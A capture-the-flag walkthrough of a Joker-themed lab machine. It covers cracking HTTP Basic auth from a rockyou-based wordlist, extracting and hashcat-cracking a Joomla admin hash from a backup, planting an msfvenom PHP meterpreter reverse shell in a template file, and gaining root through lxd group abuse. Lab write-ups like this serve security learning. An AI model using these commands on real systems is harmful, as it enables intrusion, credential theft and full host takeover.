# enumerate
open port:
- 22 ssh
- 80 http
  - Apache/2.4.29
  - /index.html (Status: 200)
  - /phpinfo.php (Status: 200)
  - /secret.txt (Status: 200)
```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```
rock? rockyou.txt?
- 8080 need to authenticate

base on the conversation, we know that the user is `joker`. With burpsuit we intercept the post request and see how it is look like, not that there is a header call `Authorization: Basic am9rZXI6aGFubmFo` is a encoded `username:password` in base64. I then create a small scrip which create a wordlist for us.
```py
import base64
filne = '/usr/share/wordlists/rockyou.txt'
joker = open('joker.txt', 'w')
with open(filne, 'r+') as f:
    lines = f.readlines()
    for i in range(0, 10): # insert line to read
        auth = 'joker:'+lines[i]
        joker.write(base64.b64encode(auth)+'\n')
joker.close()
f.close()
```
now use burpsuit/hydra and try to crack the password, this can take really long time.(hint: encode what I show you above to get password).use the joker credential to login, note that the blog is using `joomla`. let use gobuster to file out more directory
```console
$ gobuster dir -U joker -P <pass> -u http://$IP:8080/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .http,.bak,.tar,.zip -t 54
```
- /administrator/ is a admin login page.. I try to login with joker credential... didnt work
- /backup: I got so happy when I see it.. juicy XD
Oh backup.zip is password protected. Luckly for us, the password to backup.zip is the joker's password. no need to use john to crack it. There are many interesting file here but we are looking for something that containt admin credentail so we can use it to log in to the admin page. 

Bingo there is a /db which contain joomladb.sql > sql database. let use grep to find juciy stuff.
```console
kali@kali:~/THM/joker/backup-(1)/db$ grep user joomladb.sql 
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','<hash here>',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
```
BOOOM! we got admin credential. not that that password is hash using `bcrypt` (google "hashcat hash example" to define the hash). now use netcat to decryp the hash
```console
$ hashcat -m 3200 -a 0 -o crack.txt '$2y$<hashherhe>' /usr/share/wordlists/rockyou.txt --force
```
now let login to to admin page use the credential we got. So the plan is try to get reverse shell to get foothold to the server. after some diggin I found [this](https://www.hackingarticles.in/joomla-reverse-shell/). I will go for msfvenom and msfconsole way since we might need to upload stuff in the further attack and msfconsole make it easier.

start with create a meterpreter reverse shell using msfvenom
```
msfvenom -p php/meterpreter/reverse_tcp lhost=tun0 lport=1234 R
```
now back to joomla admin panel. go to *extensions* then *templates* -> *Beez3* -> and edit *error.php* with the payload that we generated with msfvenom. let go back to downloaded backup. note that you can find error.php at `/templates/beez3/error.php` so it should be the same way on the web page.

Run msfconsole
```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost tun0
set lport 1234
exploit
```
then go and visit `/templates/beez3/error.php` to execute our payload. Boom we got meterpreter shell.

Drop down to shell and run `which python/python3` to check if there are any python install, we need it to generate tty shell. Yes we have python3.
```console
python3 -c 'import pty; pty.spawn("/bin/sh")' # spawn tty shell
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```
NICE seem like are a member of lxd group. I know that we can gain root by abusing lxd privilage from [Tabby](../HackTheBox/tabby.md) check the link if you want to know in depth. In kali run:
```console
$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine # download build-alpine
$ chmod 777 build-alpine
$ sudo ./build-alpine  # build it
```
now back to meterpreter. backgroup the current chanel and then upload alpine to the server.
```
meterpreter > upload script/lxd/myalpine.tar.gz
meterpreter > channel -i 0
$ lxc image import alpine-v3.12-x86_64-20200728_1308.tar.gz --alias kurohat
$ lxc init kurohat kurocontainer -c security.privileged=true
$ lxc config device add kurocontainer kurodevice disk source=/ path=/mnt/root recursive=true
$ lxc start kurocontainer
$ lxc exec kurocontainer /bin/sh
~ # whoami  
whoami
root
ls  /mnt/root/root/
final.txt
~ # cat /mnt/root/root/final.txt
cat /mnt/root/root/final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
```
GGWP